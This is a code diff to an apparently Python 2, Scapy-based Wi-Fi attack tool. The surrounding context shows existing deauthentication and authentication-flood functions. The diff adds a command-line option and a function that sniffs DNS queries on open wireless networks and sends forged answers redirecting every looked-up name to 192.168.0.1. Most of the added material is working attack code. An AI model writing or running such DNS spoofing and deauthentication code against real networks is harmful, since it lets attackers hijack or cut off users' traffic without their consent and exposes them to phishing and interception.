@@ -54,6 +54,11 @@ parser.add_option("-f","--attack_forever",
                   default='0',
                   help="Attack the target permanently(with the option:-e,-d,-a,-m)")
 
+parser.add_option("-p","--DNS_deceive",
+                  dest="dns",
+                  action="store_true",
+                  help="Cheat the client by dnsproof")
+
 (options,args)=parser.parse_args()
 
 
@@ -103,7 +108,34 @@ def sendpackage(package1):
     os.kill(os.getpid(),signal.SIGINT)
     os.kill(os.getppid(), signal.SIGINT)
 
-
+def DNS(package):
+    try:
+        if package[DNS].qd.qname and package.haslayer(UDP) and package.dport==53:
+            qname=package[DNS].qd.qname
+            print "Found the dns request for "+qname
+            del(package[UDP].len)
+            del(package[UDP].chksum)
+            del(package[IP].len)
+            del(package[IP].chksum)
+            fake_response=package.copy()
+            fake_response.FCfield=2L
+            fake_response.addr1,fake_response.addr2=package.addr2,package.addr1
+            fake_response.src,fake_response.dst=package.dst,package.src
+            fake_response.sport,fake_response.dport=package.dport,package.sport
+            fake_response[DNS].qr=1L
+            fake_response[DNS].ra=1L
+            fake_response[DNS].ancount=1
+            fake_response[DNS].an=DNSRR(
+                rrname=qname,
+                type='A',
+                rclass='IN',
+                ttle=90,
+                rdata="192.168.0.1"
+        )
+            sendp(fake_response,iface=options.interface)
+            print "CHEAT SUCCESS!!!!!!!!!"
+    except:
+        pass
 
 def Authflood(package):
     global thread_number,auth_stop_flag
@@ -148,8 +180,8 @@ def collect_ap(package):
             print "\033[32mDetect the particular package comes from ap nearby!\n\033[0m"
             time.sleep(2)
             ssid = get_ssid(package.getlayer(Dot11Elt).info)
-            bssid = package.addr3.lower()  # 确认是addr2还是addr3？
-            try:  # 信道获取不太懂，借鉴fluxion，具体参见协议包格式，thanks to fluxion！
+            bssid = package.addr3.lower()
+            try:  # check the show() function ,and you will know the detail
                 channel = str(ord(package[Dot11Elt:3].info))
             except:
                 dot11elt = package.getlayer(Dot11Elt, ID=61)
@@ -169,7 +201,7 @@ def Deauth(package):
            #temp= threading.Thread(target=collect_ap,args=(package,))
            #temp.start()
         if stop==0:
-            #if (check==0 and options.deauth_attack_ssid!='1'):
+            #if (options.deauth_attack_ssid!='1'):
                 #Probe(package,options.deauth_attack_ssid)
             global deauth_ap,flags,deauth_client
             flags=1
@@ -219,8 +251,8 @@ def Probe(package,ssid):
         if package.haslayer(Dot11ProbeResp) and ssid==get_ssid(package.getlayer(Dot11Elt).info):
             print "detect package"
             ssid = get_ssid(package.getlayer(Dot11Elt).info)
-            bssid = package.addr3.lower()  # 确认是addr2还是addr3？
-            try:  # 信道获取不太懂，借鉴fluxion，具体参见协议包格式，thanks to fluxion！
+            bssid = package.addr3.lower()
+            try:
                 channel = str(ord(package[Dot11Elt:3].info))
             except:
                 dot11elt = package.getlayer(Dot11Elt, ID=61)
@@ -412,7 +444,9 @@ def main():
             sys.exit(1)
     elif(options.deauth_attack_ssid!='1' and options.deauth_attack_mac!='1'):
         print "This two options can not be used simultaneously,plz check your input!"
-
+    elif(options.dns):
+        print "MENTION!it can be only used with the open-wlan!if the wlan is using WPA/WPA2/WEP,this method will not work!"
+        sniff(iface=options.interface,prn=DNS)
     else:
         try:
             sniff(iface=options.interface, prn=wifisniffer)
